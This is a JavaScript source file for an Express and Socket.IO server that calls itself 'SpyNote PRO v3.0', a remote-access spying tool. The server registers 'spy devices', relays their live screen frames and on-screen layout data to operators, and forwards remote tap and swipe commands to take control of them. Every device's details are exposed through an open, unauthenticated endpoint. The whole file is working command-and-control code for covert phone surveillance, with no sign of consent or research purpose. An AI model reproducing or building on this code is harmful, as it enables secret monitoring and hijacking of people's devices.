const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 30000,
    pingInterval: 10000,
    maxHttpBufferSize: 100e6
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));

const devices = new Map();

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Spy client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id,
                lastSeen: Date.now()
            });
            socket.join(`device_${deviceId}`);
            console.log('📱 SPY DEVICE ONLINE:', deviceId, deviceInfo.model);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    // 🔥 SCREEN FRAMES
    socket.on('screen-frame', (frameData) => {
        const deviceId = frameData.deviceId;
        if (devices.has(deviceId)) {
            devices.get(deviceId).lastSeen = Date.now();
            socket.to(`device_${deviceId}`).emit('screen-frame', frameData);
        }
    });

    // 🔥 LAYOUT DATA - FIXED RELAY
    socket.on('layout-data', (layoutData) => {
        const deviceId = layoutData.deviceId;
        console.log('📋 LAYOUT RECEIVED:', deviceId, layoutData.elements?.length || 0, 'elements');
        
        if (devices.has(deviceId)) {
            socket.to(`device_${deviceId}`).emit('layout-data', layoutData);
        }
    });

    // 🔥 CONTROL COMMANDS
    socket.on('control', (controlData) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = controlData;
        if (devices.has(deviceId)) {
            io.to(`device_${deviceId}`).emit('control', controlData);
            console.log(`🎮 CONTROL: ${action.toUpperCase()} → ${deviceId.slice(0,8)} (${x||0},${y||0})`);
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Spy device OFFLINE:', deviceId);
                break;
            }
        }
    });
});

// Keep-alive ping
setInterval(() => {
    const now = Date.now();
    for (const [deviceId, info] of devices.entries()) {
        if (info.connected && (now - info.lastSeen > 45000)) {
            devices.set(deviceId, { ...info, connected: false });
            io.emit('devices-update', Array.from(devices.entries()));
        }
    }
}, 30000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 SpyNote PRO v3.0 - LAYOUT SPY`);
    console.log(`🌐 Web: http://localhost:${PORT}`);
    console.log(`📱 Screenshot + Layout + Controls READY!`);
});
